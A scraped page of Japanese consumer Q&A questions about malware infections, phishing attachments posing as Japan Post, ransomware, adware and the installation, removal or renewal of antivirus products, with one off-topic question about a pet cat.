日本郵政からの添付を開いてしまいました。 ZIPになっていて、開くを押したのですが開けず、何度も押してるうちに、 青い画面に白文字で文字がたくさん出てきて、強制的にシャットダウンされました。 再び立ち上げると、問題なく使えているのですが、ウイルスに感染しているか確かめる方法はありますか？ ネットで検索したところ、インターネットが必ず『空白のページ』になる。 と書いていたのですが、そのような現象はありません。 また、ウイルスバスター等のソフトを入れていないので、ダブルチェックを行って下さい等の過去の回答もよく理解できないでいます。 勝手に送金される等のことが調べた中で書いていたので、すごく不安です。 どなたかご回答お願い致します。
ESETですがヤフオクでマイオクを開くとトロイの木馬を検出しページを開けません。 実際ヤフオクが攻撃にあっているのか（ヤフーがあえてマルウェアを仕込むとは考えにくいため） ESETがご検出しているのかわかりませんがアクセスできません。 出品者なので割とまずい自体かも知れません。 同じような状況の方いますか？ ESETでご検出だった場合の対処方法等あれば教えて下さい。 自分ではESETとヤフオクに問い合わせてみます。
日本郵政を騙った迷惑メールの、 添付ファイルを解凍、実行してしまい、 パソコンが感染してしまいました…。 写真のような画面で固まってしまい、 どうしたらよいか困っています…。 郵政省(本物)のサイトや、ニュースなど見たのですが 解決法が見つけられませんでした。 お恥ずかしい話ですが、 お教え下さい、よろしくお願いします
先日、郵便局を名乗るメールのZIPを開けてウイルス感染？したかもしれないです。 開封した瞬間インターネットを開くと一番最初に空白のページが出るように設定が勝手に変わりました。 でもマカフィーでスキャンしても、インターネット上にあるサイトでスキャンしてもウイルスが出てきません。 調べるとその郵便局のウイルスはスキャンしても出てこないと書いてありました。 パソコンを初期化するしか無いでしょうか？ 今一番心配なのは楽天などに登録していたクレジットカード情報やパスワードの事です。 教えてください・・・。
新しくノートパソコンを買ったら「McAfeeリブセーフ」の60日間無料お試し版がインストールされていました。「フレッツウイルスクリア」を契約して継続しているので、この度購入したノートパソコンにフレッツウイルスクリアをインストール設定しようとしたところ、McAfeeリブセーフがインストールされているためにうまくできませんでした。「McAfeeリブセーフ」のお試し期間中ですが、解約というか、削除する方法があるのでしょうか？よくわからないので教えてください。
キングソフトのインターネットセキュリティからですが・・ 画像は、復元直後にセキュリティとOSのアップデートして、フリーのWEBブラウザーやバックアップ復元ツールをインストールした直後付近です。 この他に「画面ハイジャック」と命名されているウイルスも、やはりwindowsの復元直後に検出される事が良くあります。 ちょっと最近、用事がありまして、XPの復元繰り返しています。　その過程で発見したことです。　以前は検出されていませんでした。　マザーボードは最近交換しています。　 数年前マカフィーとかでもヤフーツールバーで、間違った検出とかあったらしいのですが、これは何なのかと疑問視しています。　このツールバーでもトロイ検出してます。 宜しくご判断くださいませ。
アドオンの管理で削除できなくて困っています。 　Windows8.1でIE11を使用しています。 　IE→ツール→インターネットオプション→プログラム→アドオンの管理→表示→許可なしに実行→利用不可……の場所にあるもの全てが削除できません。 　『Internet Explorer 11でアドオンをアンインストールする方法(https://121ware.com/qasearch/1007/app/servlet/re …)』では削除できる様子なのですが、自分のところでは出来ません。 　それと、『トレンドマイクロ』、『Malwarebytes』、『adwcleaner』等のウイルス対策ソフトでフォルダなどは削除したはずなのですが、アドオンの管理内では残っているのが不思議です。ソフトでは削除できないのでしょうか。それとも、まだフォルダなどが完全に削除出来ていないのでしょうか？
advanced system protector からメールが来ました。regclean pro を購入したためと書いてありますが、買ってないですし、どうして名前とメールアドレスがわかったのでしょうか？regclean pro のページを見た後にamazonでメールアドレスの変更をしたのですが、何か関係がありますか？マカフィーを入れていて、異常なしとなっていますが、これからどうすればいいですか？よろしくお願いします。
マカフィーの30日無料体験版を使っているのですが、コントロールパネルのセキュリティの項目がどれも赤いままです。パソコンをネットにつなぐと、アクションセンターにセキュリティの不備（スパイウェアと不要なソフトウェアの対策）が必ず出ます。 一方、マカフィーを立ち上げるとセキュリティ対策はすべて有効になっています。何が原因でしょうか？ マカフィーの前にウィルスバスター1年版を入れていたのですが、その時は問題なかったです。また、マカフィーの無料体験版はつなぎとして入れているので、期限が切れれば別な物に替える予定です。
PCがウイルスに感染しています。 感染しまくっててネットすらもろくに使えません。 ノートンをダウンロードすれば直るのですか？ 無料体験版がありますけど。
Windows8.1を使用しています。 今はノートンを入れています。以前はウイルスバスターやWindows Defenderを使用していました。 　【１】　パソコンで、インターネットに接続しているだけでも、ウイルス、マルウェア、スパムウェア、アドウェアなどにかかる危険性はありますか？ 　【2】　検索欄に文字を打ち込んでエンターキーを押したり、GoogleやYahoo!で画像検索をして閲覧しているだけでも、ウイルスなどにかかる場合はありますか？ 　【3】　webサイトにアクセスしないと、上記のような危険性は出ないのでしょうか。あと、専ブラ（TweenやJane Style）で閲覧しているだけでも、ウイルスなどにかかる危険性はありますか？
郵便局を名乗るメールからウイルスが運ばれてきました。 馬鹿な私は添付ファイルを開いてしまいました。 普通にネットは使えますが、開くときに必ず空白のページが開かれます・・・。 感染していると思うのですがどう調べてたりいのか、どう排除すればいいのかわかりません・・・。 ウィンドウズ７です。 どうかお助けを・・・
以下のメールをうっかり開けてしまいました。 ↓ 配達員が注文番号 xxxxxxxxxx の商品を配達するため電話で連絡を差し上げたのですが、つながりませんでした。 従ってご注文の品はターミナルに返送されました。ご注文登録時に入力していただいた電話番号に誤りがあった ことが分かりました。このメールに添付されている委託運送状を印刷して、最寄りの JAPANPOST 取り扱い郵便局 ちょうど荷物を送ったばかりなので、うっかり添付ファイルを開けてしまいました。 ファイルは.txtで開けたら意味不明な文字が書かれていました。 パソコンはほとんど初心者レベルなので、ウィルスに感染したのかどうかわかりません。感染していたらどのような対処ををすればよいのでしょうか。 ウィルス対策ソフトはマカフィが入っていますが、スキャンしてもウィルス検知しませんでした。
質問タイトルは「ウイルス、マルウェア」となっていますが、正直なところ、自分でも何なのかよく分からないので、「ウイルス、マルウェア」としておきます。 　本題です。 　私はInternet Explorerを使用しています。パソコンは一体型デスクトップで、東芝の物です。現在Windows8.1です。ショートカットキーや、HTMLがほんの少し理解できる程度のパソコン初心者です。 　先日、『ロケットニュース24』、『niconico』、『twittbot』を閲覧していたら、添付した画像の「参考1」ような広告が、他の広告に紛れて出てきました（画像はいかがわしいものだったので、モザイクをかけています）。その広告はgifアニメーションなので動きます。 　『ロケットニュース24』内では右上に表示され、『ニコニコ動画』内では「動画をもっと見る」の下部に、『ニコニコ生放送』では「番組を探す」の右、及び画面右上に表示されました。『twittbot』での表示場所は覚えていません……。 　時間が経つと別の広告に変わりますが、その広告は至って健全な広告です。時間が経つと、また例の広告に変わります。 　気味が悪いです。 　問題の広告を最初に目撃したのは2016年1月中旬でした。その頃『Google Chrome』のDLをしたので、それと何か関係があるのではないか、と若干思っています。 　また、過去にウイルスやマルウェア（参考2）に感染しましたが、下記のソフトで削除したはずです。ですが、感染したウイルスやマルウェアなどが完全に消し切れていないから、このような事になったのでは？　とも考えています。……アドオンの管理内（参考3）に何やら怪しいものが残っていますが、パソコン初心者なのでよく分かりません。 　『トレンドマイクロ』、『ノートン』、『Windows Defender』、『Malwarebytes』『adwcleaner』を使用しましたが、例の広告は表示されます。「プログラムと機能」内には、「それっぽいもの」は残っていません。レジストリの中の「それっぽいもの」を削除しましたが、駄目でした。これ以上レジストリをいじるのは怖いです。 　ソースを調べても何も分かりません（ソースはコピーしてメモを控えています）。 　かれこれ一ヶ月ほど対処法を調べてきましたが、依然として手掛かりは見つかりません。 　バックアップなどはよく分かりません。リカバリや復元ポイントなどもよく分かりません。映像、グラフィック系、CG系の作業をするので、容量の問題でCDやポータブルHDDに移すのは難しそうです。 　例の広告が表示される度に錯乱しそうになります。とても辛いです。どなたか助けてください。精神面でもパソコンの面でも狂いそうです。
自分のブログや、開いたサイトにロシア語と思われる広告、小さい枠広告がいくつも連なっています。これが構成されるのを待ってる如くに見たいサイトも構成されないため、辛気臭い限りです。ここ数ヶ月前からこんな現象が出始めました。ウイルスの類に犯されたんでしょうか？どうしたら良いでしょうか？ちなみに「ウイルスバスター」には加入しておりますが、除去してくれません。
マカフィー製品の購入の際のクーポン番号とは何ですか？
ウイルスバスタークラウドからもうすぐ時間ですと表示されるんですが、どうしてでしょうか？
ウイルスバスタークラウド10を使ってます。 ブラウザで検索して出た検索結果のリンク先が安全なページなのかどうが、検索結果のリンクごとに文字全体が緑や赤などの色で判別表示されます。 2、3日前に検索しているときに、キー操作を誤ったのか、リンクごとに付くはずの色が付かなくなりました。 これを元に戻したいです。 やったことは、ブラウザのキャッシュを削除・ブラウザを再インストール・ウイルスバスターの再インストール。 Trendツールバーは有効で、この安全性の確認の表示もオンになっています。 お手上げ状態なのでよろしくお願いします。
ドスパラでパソコンを購入した際にマカフィーの期限延長コードが無料でついてきたので使用しようとしたのですがクレジットカードが必須項目にありました。 クレジットカードは持っていないのですがこの場合は延長コードを使用することはできないのでしょうか？
pc　開くと勝手にブラウザー～広告出　クリプトウォールなる　お金払えば消しますよ？英語で？
パソコンはWindows7です。 CPU使用率が前まではデスクトップで1～5%にたいして今は50～70%になってます。 adwCleanerを使って消えてくれません。 消し方を教えてくださるとありがたいです。
IE、Firefoxでウインドウ内のどこをクリックしても別サイトに飛んでしまう（サイトのスクロールは出来ますがサイト内のリンクはクリック出来ない　サイト全体に別サイトへのリンクがある状態　クリックして別サイトへ飛ぶと解除される）のですがどうすればよいでしょうか？
昨日、父のPCメールボックスに父自身、覚えのない支払受領メールが届きました。 どうやらavangateという企業が提供しているReimage Repairというセキュリティソフトのオンライン決済確認メールのようです。よく見ると、そのメールには「お客様のカードご利用代金明細書には、Reimage Ltd. ではなく avng8.com REIMAGE が表示されることにご注意ください。」との記載があり、父に確認したところ、「クレジットのカード番号は入力していない。」との回答で怪しさ満点です。 父は70過ぎの高齢なので、何か悪徳のセキュリティソフトの罠に引っかかってしまったのでは？と心配です。 普通、オンラインで決済する時ってクレカや銀行口座の番号を入力するのが普通だと思いますが、そのような必要のない決済方法ってありうるんでしょうか？父はクレカや銀行口座の番号は入力していない、と言っているので、詐欺とみてこのまま放置したほうが正解でしょうか？ どなたかアドバイス下さい！
現在Android端末(XPERIA)を使っています。DOCOMOで契約をした際に「strong defence security」というセキュリティーソフトの購入を勧められたので購入したのですが、よく見るとマカフィーのセキュリティーソフトも入っていて2つ入っていて大丈夫なのかなと思い、質問させて頂きました。 なお、現在までstrong defence securityしか使って来なかったので、その場合マカフィーのアプリはそのままにしておいていいでしょうか。重ねてお願いします。
元々入っていたマカフィーが切れる為、更新するか他の物にするかで迷っています。 結構前にESETに入っていました。 不便でもなく安かったのですが評価サイトにて、 ・Webサイト安全評価は× ・ID/パスワード管理は× ・ネットバンキング保護は△ となっていたのが気になりました。 他のセキュリティソフトと比べて著しく劣るところが無ければまたESETを使いたいとも 思うのですが…。 詳しい方のアドバイスを頂きたく思います。
スマホでネット閲覧中かその後くらいに「(私が使用するスマホ機種型番)でウイルスが検出されました」とのメッセージ(警告？)が表示され、画面の下方に「ウイルスを今すぐ除去」と書かれたボタンがあります。この警告文の上部にはよく見るGoogleの4色のロゴがあります。でも、URLは次のものです。 vogmobiapq.com/(以下ハンパなく長い文字群が続く) この警告に従って、下方のボタンをタップするとどんなことになるでしょうか？ 試しにパソコンで.comまでの部分を検索してみると何もヒットせず、URLの窓にhttp://を付けて直接入力すると画面左上に10ptサイズ位の小さめな文字で「TESTING HTML S3 」と表示されるだけです。グーグルでもvogmobiapq.comなどというURLを通して表示する場合があるのでしょうか？ 対処法を教えてください。
ウインドウズ10　32ビットです。 なにかいい無料のセキュリテイソフトは、ありますか？ ちなみにマイクロソフトのセキリテイエッセンシャルは、ダウンロードできませんでした。 どうしてでしょうか？
Norton Securityについての質問です。 Norton Security（以降NS）を入れているのですが、マインクラフトのサーバーを開こうとしても NSがファイアウォールを邪魔をしているようでアクションセンターで確認してみると、 NSとWindowsのファイアウォールがあり、NSが有効、Windowsが無効になっておりました。 Windowsを有効化にしようとしてもクリックできませんでした。 インターネットで色々検索してみたところNSのスマートファイアウォールを無効化すればいい みたいなことが書かれていました。そしてNSの設定でスマートファイアウォールを無効化してみたのですがそれでもファイアウォールの設定（Windowsの有効化）はできませんでした。 誰かファイヤーウォールの設定（Windowsの有効化または、NSのファイアウォールの無効化）の方法を教えていただけないでしょうか？
最近確認せず既に使用しているソフトのアップデートだと思ってインストールしたものがあり、それ以降にパソコンにたくさん余計なものが出てきます。 ウイルスバスターなどに入っておらず、 インターネットに繋ぐと、インストールしたくもないものがたくさん出てきます。 [インストールしない]や、アンインストールしても残っています。再び出てきます。 どのようにしたら、これらを無くせますか？ インターネットに繋がないと通常です。 ウイルスバスターを購入したら今感染しているパソコンも直せるのでしょうか？
ノートンインターネットセキュリティを使っていますが、この度引っ越すために、光とブロバイダなどの契約を解約します。 その後半年ほど新居で生活し、また転居をします。 どんな手続きが必要でしょうか？ 1年更新ですが、引っ越すとどうなりますか？
期限切れでアンインストールしたのですが、カスペルスキーのアップデート催促がずっとでます。これ、どこにファイルありそうですかね。ちなみにプログラムファイルフォルダのカスペルスキーは消してます。よろしくお願いします。
送った覚えのないメールの返送が一日80通以上届きます。 タイトルは [SPAM]Returned mail: see transcript for details で、 差出人は確かに私のアドレスですが、 送り先は見知らぬアドレスばかりです(恐らく海外)。 添付ファイルもあるためスパムかと思いますが、 メーラーで「セキュリティレベル:高」にしても 迷惑メールに登録しても、 メッセージルールでこのタイトルをゴミ箱に直行させる設定にしても 送り主が「Mail Delivery Subsystem<MAILER-DAEMON@利用中のプロバイダ.ne.jp>」の為か 一向に削除も隔離もされません。 仕事に使用しているメールアドレスで、広範囲に名刺を配ってる為、 メアドの変更は出来かねる状況です。 対応策がありましたら教えてください。
Krypton Anonymous BrowserというアプリはTorが組み込まれていてIPを変えてくれますが、このアプリ自体が情報を抜いていたりという危険性はないのですか?
パソコンを起動しましたら突然　　　American　 　　　　　　　　　　　　　　　　　Megatrends の画面がいきなり表示されてマウスも使う事が出来ません。強制シャットダウンしてもう一度きどうしましたが同じです、セキュリティー等に詳しい方対処法を教えて下さい。宜しくお願いします。尚、デスクトップです。これはノートPCで入力しています。
スマホ用ウイルスバスターはどれがお勧めですか。無料でよいものはありますか。
パソコンを買い替えることになり、一週間後に新しいパソコンが届きます。 それに当たって、新しくウイルス対策ソフトを買いたいと思います。 今のPCではwebrootを使っていて、最初に入れてもらうときには電器屋さんにお願いしたので、どうやって入れたのか分かりません。 その後、更新のときにはCDなどのモノは届かないで、お金を振り込むと自動で更新されています。 今新しいPCのために購入する際、今のPCから申し込みをすると、今のPCに自動的にインストールされてしまうのでしょうか？それとも、CDのような形で届いて、自分で新しいPCに入れることができるのでしょうか？ 公式サイトを何度も眺めましたが、そこがはっきり書かれていないので困っています。 どなたかご存じの方、教えてください。
Windows7から10にしました 三ヶ月前ぐらいにです。 当初、知人にexeファイルを勝手に入れられて 怖いので10にアップデートする際に データをすべてフォーマットしました。 それからちゃんと最新のウィルスソフトも入れており 変なファイルをダウンロードもしてないのですが 最近、コマンドプロンプトのような画面が一瞬だけ出て 文字が書いてあるのかも覚えてないのですが 一瞬だけ出て消える現象が何度かあります。 スクリーンショットで撮る暇も無いぐらいの一瞬なので正確にメモできません。 ウィルスソフトはESETというのを使ってます。 よろしくお願いします。
ある日突然特定のサイトが表示できなくなりました。 IEで開くと、"このページは表示できません"と表示されます。 表示できないのは、google、youtube、twitter、facebook、などです。 yahoo、biglobe、amazon、ニコニコ動画、などその他のサイトは表示できます。 自宅にある他のPCですと、googleなど、全て普通に見れます。 何が原因でしょうか。
先日、「Bitdefender Internet Security」の無償ライセンスが公式サイトで配布されていることを知り、あれこれ考えた結果、このソフトをインストールしました。 今のところ、特に不具合はないので、このまま使っていこうかなと思っています。 ただ、ネット上の評判を調べたときに、「BitdefenderはPUP（不要な変更を加える悪意のなるプログラムの総称）を検出できない」という評価を見かけたこともあり、ちょっと心配になっています。 本当にBitdefenderは、PUPを検出できないのでしょうか？検出率ランキングで上位だったり、各種調査機関での「優良製品認定」を受けていたので、この情報を聞いた時は意外でした。 実際のところ、Bitdefender製品版は、ちゃんとした信頼性や性能の高さを備えているのでしょうか？ 今は「Bitdefender＋Malwarebytes Anti-Exploit（MBAE）」で使っていますが、これは「Avira無償版＋EMET」の組み合わせと比較して、どう思われますか？ 皆様のご見解をお聞かせください。
1-ウイルスバスター(クラウド)3台install可3年間用と、 ↑クレジットカードにて、3年毎に自動継続している。 2つのosにinstallなので、1台分余ってます。 2-ウイルスバスター(クラウド)3台install可1年間用 ↑昨年(OSを増やしたので)新規に追加購入した。 こちらも、2つのosへinstallなので、1台分余っています。 3-モバイルバスター(アンドロイドのタブレット)の為にnetにて契約 ↑ の3つを使用してます。 モバイルバスターは、タブレットを購入してすぐ、netで契約したのですが、タブレットの中の何処にinstallされてるのか、探しても見当たりませんが、3年用バスターと同じクレジットカードから引き落とされたのでinstallされて居る筈。 3-モバイルバスター←が、1/31までなので更新(延長)したいとおもったのですが←当初から(メルアドとパスワード)←を登録した覚えが無い為←更新手続きの時、(メールアドとパスワード)←の入力を促されても、手続きが取れません。 ----- 1-と2-のバスターは各os、2台づつとしか使って居ない為どちらも、一つづつ余っています。 --- 最近知ったのですが、1-や2-のタイプ(ウイルスバスター(クラウド)←が、モバイルにも使えると言う記事を見た様な気がするのですが、←何か特別な手続きが必要なのでしょうか、それと、(ウイルスバスター(クラウド)は、←容量的に可なり大きいですが、モバイルバスターの方が、容量は小さいのでしょうか？ ------ どちらも容量的に同じ位で、(ウイルスバスター(クラウド)が←タブレットにも使用可能なら、1-か2-←が各1つづつ余って居るので、わざわざ、モバイルバスターを更新するまでも無いと思っているのですが、 宜しく　お願いいたします。
３年前に初売りでウイルスバスター３年前に購入した時は１万円＋消費税で買いました。きょう電話で 聞きましたが正規の値段です。以前は４０００円ぐらい安かったのですが。もう値引きはしなしのでしょうか。
レジストリーのエラーがみつかりました。と出ますがインストールしても安全ですか？ 他にいくつかのエラー修復のｃｍが消しても消してもでます。 出ないようにできませんか。ご存知の方教えてください。また。こういうサイトは安全でしょうか。
猫を飼ってるのですが、うちには小さい子も居て、全然配慮が無いです。なので、1人で見に行かないで ( 完全室内飼いなので ) と言ったのですが 全然言うこと聞いてくれません。意味が伝わってないようで、見に行ってもいいでしょぉ？と言います。だから、ママとは良いけど、1人では見に行かないで！優しくできないんだから！と言ったのですが、多分いうこと聞きません。私が主に世話をしていて、弟の部屋で飼っています。弟の部屋は鍵がかけられないので 鍵をかける以外の回答でお願いします
アンドロイドのスマホを現在使っています。外国に住んでいます。二日ほど前から原因は不明ですが突然、あなたの携帯はアダルト動画を視聴したためセキュリティーがかかりました。解除してほしければ＄２１０を４８時間以内に支払って下さい、と書かれたものが現れて来ました。それから私の携帯はホーム画面に戻ることが出来ません。非常に困っています。再起動は何回も試しました。再起動すると２０秒間ほど自由に携帯が使えるのですがそれがすぎるとまた支払いを要求する画面になります。どうすればいいのでしょうか？なにかウイルス感染した後でも使えるウイルス駆除できるアプリなんかはありませんか？もしくはなにかこのような状況を解決する方法を教えて下さい！
現在ウィルスセキュリティZEROを利用しています。 他のウィルス対策ソフトを試しに使おうと一旦アンインストールし、他社のソフトを使ってましたが、やはり使いなれてるウィルスセキュリティZEROにもどそうと、マイページからファイルをダウンロードし、解凍、インストールしようとしたら、 「メールアドレス」と「シリアルナンバー」が入力されていませんと、エラーメッセージがでてインストールできません。 ウィルスセキュリティを削除したとき、削除ツールで完全削除してしまったのが原因でしょうか？再インストールしても改善しません。 アドバイスお願いします。
お世話になります。 マイクロソフトエッセンシャルは　10でも　使えますか。もし使えないなら マイクロソフトがだしている10で使用できる、無料ソフトはありますか。 私が購入予定のＮＥＣのＰＣには、マカフィーが入っています。無料にこだわりた いのですが、 マイクロソフトエッセンシャルをVistaで、使用してきて何も問題なく、 きたので、マイクロソフトエッセンシャルにこだわりたいのですが、 それから、10に引っ越しするときは、マカフィーを最初に、アインストールしてから、 別のウィルスソフトを入れるのですか。それとも、一端、両方を入れてから、そのあ とに、マカフィーをアインストールするのですか。 細かい話で恐縮です。 マイクロソフトエッセンシャルより、さらにすごい、無料ウイルスソフトがもしあれば、 教えてください。 よろしく、お願い致します。
PCを買ったばかりで何も知らない初心者です。 ウイルスを検出したと画面に出てきたのでSecurity Riviverというものをインストールしてウイルス検出したところウイルスを検出とでて、駆除のところをクリックしたら5000円かかるとでたのでやめました。 そのあとSecurity Riviverというのを調べたところ嘘のウイルス検出をして契約させるものだと分かったので、Trend_Microというものでウイルス検出しましたがウイルスが検出されませんでした。 もうどうしたらいいのかわかなくて本当に困っています。 説明不足だと思いますがどうかお返事ください。
Vitaでネットサーフィンなどをしていて、もしウイルスと出くわした場合、無線ルーターを経由して有線でつないであるPCに行き渡るということはありますでしょうか？
こんばんは。 最近勝手にブラウザが開き 画像のようなのがでてきます。 これは本当に感染しているのでしょうか？
ノートン アンチウイルス　オンラインを一時的にオフにする方法を教えてください。 Win7です。
ウイルスセキュリティをアンインストールしていますが、削除されません。メーカーのアンインストールでシリアルナンバー入力しても何度も確認してもエラーに為るため出来ずに居ます。 何かしら方法ややり方がありましたら教えて下さい‼
17時40分くらいに、NTT　セキュリティソフトの再インストールを開始しましたが1時間半以上たった今も、「インストール中」のままです。 前回は正確な時間は覚えていませんが、こんなにはかからなかったはずです。 この時間では電話サポートも終わっていますので、こちらに質問しました。 インストールを中断するべきか、それとも他に対策があるのかを教えてください。
どなたか詳しい方、アドバイスお願いします。 先日、変なウイルスに感染したらしく困っています。 PC Windows7 64ビットです。 感染経路は不明ですが、クロームで検索すると頻繁に関係のないサイトに行くようになったため 対処法がわからずにPCをリカバリしました。 リカバリ後に、必要なソフトをインストールしていきましたが、その時にまたウイルスに感染したかもしれません。 リカバリ前は色々な症状が出ておりましたが、現在はひとつだけです。 クロームで検索して、検索一覧が表示されます、そして一覧からどれかタイトルをクリックすると 10回に一回くらいの割合で関係のないサイトに行きます。 多くがDMMアダルトアニメのサイト(DMMはアカウントすらもっていません)、そして、たまにPCにウイルスがあるという警告のサイト ウイルス警告のサイトはもちろん怪しいサイトで「あなたのコンピューターに～」 と女性の声で音声が発せられます。 ごくまれに、別の怪しいサイトに飛ぶこともあるようです。 変なサイトに飛んだ場合は、ブラウザで戻って、再度クリックするとちゃんと開きたかったサイトが開きます。 せっかくPCをリカバリして何日もかけて必要なソフトをいれて仕事にも使える状態にしたので リカバリだけはもうしたくないのです。 なんらかのプログラムがそのような作用を起こしていると思いますが フリーソフトのインストール時に一緒にインストールしたしまったような、怪しいと思われるものは、自分で削除したつもりですが この症状だけは治すことができませんでした。 レジストリをいじったりして治るようなものでしょうか？ そのへんは詳しくないので どなたかアドバイスをお願いいたします。 m(_ _)m
インカムという技術でPCユーザーを盗撮することは可能なのでしょうか？盗撮すると自分のPCにどのような現象が起こるのでしょうか？教えてください、よろしくお願いします。
ウイルスバスタークラウドから、 「Google Chromeブラウザを保護するために、Trendツールバーをインストールせよ」という提言（ポップアップ）が来ました。 たしかに、ブラウザはG.Chromeを使っています。 しかし、なんで、わざわざChromeを指名して、ツールバーインストールを薦めてくるのか、よく解りません。 これは善意の提言なのでしょうか？ ちなみに、あれこれのツールバーを入れるのはあまり好きではありません。 「楽天の通販はよく利用するが、楽天ツールバーは入れたくない」 どちらかというとそういうタイプなのですが、VBに「ブラウザをWeb脅威から保護するために」などと言われるとさすがに動揺してしまいます。 インストールすべきなのでしょうか？
google chromeの検索バーが勝手にbringになっていました。 しかも名前はgoogleで中身はcoldserch?になっててbringに飛びます。 見つけたはいいのですが、「この設定は管理者によって制御されています」と出て変更できません。 設定のリセット、ブラウザのアンインストールなどをしても消えませんでした。 どなたか制御の解除方法を教えてください。
ESET Smart securityの体験版を使い、使用する気が無いのでアンインストールしようとしましたが、出来ません。なぜでしょう？ 操作説明 設定からアプリ表示 Eset smart securityを選択 アンインストールボタンが表示されたので押す このアプリがＰＣのソフトウエアを更新することを許可しますか？　はい WindowsにESETsmartsecurityを設定してます。しばらくお待ちください。 （ここで一旦はシステムのアプリ表示画面からESETが消える） バーコードがゆっくり右へ延びる あと○○秒の表示が出たところで、バーコードが縮み始める！！ バーが無くなったところで、アプリ表示にESETが「再表示され」終了 どういうこと？ 立ち上げる度ESETなんとかが表示され困ってます。 どうしたらいいでしょう？ PC ACER ES1-511 series Windows 10
ｊ　を押すとパソコン画面の左上に小さいマスがでてそこに　J　って文字がでます。その文字の隣に緑色のひねったような矢印が出ます。 どうしたら　ｊ　が使えるようになるでしょうか？ 詳しい方ヘルプです。
Google chromoを開くと最初にabout blankが出ます。 直したいのですがどうすればよいのかわかりません。 教えてください。
vvvウイルスなどのランサムウェアは事前に拡張子を独自のものに変えるなりすれば、そのファイルは暗号化されずに済みますか？ (例：「xls」→「my_xls」)
今日、今まで使っていたAvira無料版をアンインストールし、替わりにavast無料版をインストールしました。 Avira無料版はいいと思っていたのですが、なぜか定義ファイルの自動アップデートが失敗することが多くみられ、最新の定義ファイルの適用が無いままネットを使うことが時々ありました。これではあまり良くないと思い、仕方がなくavast無料版にした次第です。 ・avastの感度（ヒューリスティック感度）は、最高レベルにしています。 ・avastの他に、「MBAE（Malwarebytes Anti-Exploit）」も導入しています。 ・OSやFlash Player・Adobe readerは、最新版にアップデートしています。 上記のような環境です。 Avastの検出率でも、とりあえず大丈夫でしょうか？ Avira無料版と比較して、安全性が大きく落ちることはあるのでしょうか？
よろしくお願いします。 ｐｃはあまり詳しくなくどう対処してよいか困り果てています。 数日前からネット（エクスプローラー）を立ち上げると重くておかしいと思っていました。 あまりに遅いのでタスクマネージャーで起動ソフトを確認したのですがエクスプローラーしか 起動していませんでした。 仕方なくシャットダウンで再起動をかけたところ 画面がシャットダウンの画面に切り替わる瞬間に画面いっぱいに外国のアダルトサイトが出ていました。 しかも2・3個です。 慌ててウイルス駆除ソフトで検索をかけたのですが検出されませんでした。 コントロールパネルのＰＣの復元を使っても駆除できませんでした。 裏に入り込まれてしまったようです。 怖くてＰＣを触れない状態です。 初期化も考えましたがデータのバックアップをとっておらず避けたい状況です。 使用PCはWindows7です。 どなたか駆除の方法を教えてください。 お願いします。
WindowsUpDate 自動更新で平気ですか？　Win7 今年だか、去年だかに、PCがUPDateで、壊れるようなことありませんでしたっけ？ 自動更新しても、平気ですか？・・・。
ほぼ全てのフォルダが開けなくなり壁紙も変更されました 恐らく人質型ウイルスかと思います 全てのファイルにテキストドキュメントとHTMLドキュメントが追加されています 載せた画像はHTMLを開いた先の画像です このウイルスの名前もしくは対処法を知っているのでしたらURLでも構いませんので教えてください 回答のほどお願い致します
現在windows10でセキュリティソフトとしてNTTセキュリティ対策ソフトを使用しています。これからNTTを解約するためセキュリティソフトが使えなくなります。そこでこれに代わるソフトが必要なのですが、もともとついてるwindows defenderで問題ないでしょうか？ また、この場合セキュリティソフトを 「windowsファイアウォール＋NTTセキュリティ対策ソフト」から 「windowsファイアウォール＋windows defender」にする という考え方で合っているでしょうか。 もしdefenderでは弱いようなら別のセキュリティソフトを検討しようと思いますのでそこも合わせて教えていただけると助かります。よろしくお願いします。
全てのデータファイルが知らない間？に勝手にVVVファイルに変わってしまい、開けなくなった。 因みに、まだ一部XPで作業していますが、外付けHDD内のファイルは大丈夫のようです。パソコン内のデータの 拡張子が.VVVに書きかえられ（後ろに追加され）、ファイルのデータが壊れているような・・・。 新しく作成して保存したデータは開けます。 何か良い解決策があれば教えてください。当方、PCはそれほど詳しくありません。
Mac版のSophos Anti-Virusのフリー版を使用しています。 ウイルス検索を実行してみたのですが、特定のファイル（dslocal-backup.xar)というファイルを検索するところで止まってしまい検索が終了しません。 何か対処法を知っている方がいたらご教授願います。 一応ネットで調べてみて試した対策がありましたがどれもやっても結果は同じでした。 ・オートアップデートを停止する ・検索中はオンアクセス検索をOFFにする
パソコンを起動させている間中　めーっセージが　ウィンドウで表示されます。 インストールすれば　有料になるのか？　ずっとこの調子で困っています、 解決方法知っておられる方　教えて下さい。
初質問です。 ＶＩＳＴＡをインストールしたｐｅｎ４デスクトップＰＣを、故障したメインＰＣの代役として環境設定中なのですが、あまりにネット接続スピードが遅くて悩んでいます。 ＯＳから再インストールしたりファイヤウォールソフトを変えたり試行錯誤した結果、ａｖａｓｔの設定に行き着きました。 現状、フレッツ光の戸建てＩＰｖ６で、常駐機能の「ウェブーシールド」がデフォルトのままだと２～９Ｍｂｐｓ、これをオフにすると４０～８０Ｍｂｐｓといった値です。（ＮＴＴ東の測定サイト） いくらなんでもオフで使うのは無謀なので、「スキャンさせたい拡張子とＭＩＭＥタイプを指定」する機能を使おうと思うのですが、ネット検索しても設定例が見つからず、単なるオッサンには下記程度しか思いつきません・・・。 どなたか、加筆・訂正して、テンプレート作りに協力お願いします！ ちなみに、ネットサーフィンが主な用途で、ネットバンク等を使う予定はないので、あまり厳重な必要は無さそうです。 叩かれ台 拡張子 ： ．ｈｔｍ ．ｈｔｍｌ ．ｘｍｌ ．ｊｓ ．ｖｂｓ ．ｃｓｓ ．ｃｇｉ ＭＩＭＥ ： text/html text/xml text/javascript text/vbscript text/css application/x-httpd-cgi
カスペルスキー インターネット セキュリティで「危険にさらされてる可能性があります」と表示された、どうすればいいですか？
ＮＴＴ光で無償で使えるウイルソフト（トレンドマイクロ）を使用しています。 パソコンの動作が遅いわけじゃないんですけど、ＮＴＴのウイルスソフト以外でスパイウェア―対策ソフトとかレジストリーをクリーンにするソフトとか使っておいたほうが良いのでしょうか？ 現状では何も問題はないのですが、ウイルスソフト同様に対策するのが当たり前？なのかどうか・・・その判断が分からなくて質問しました。 よろしくお願いします。
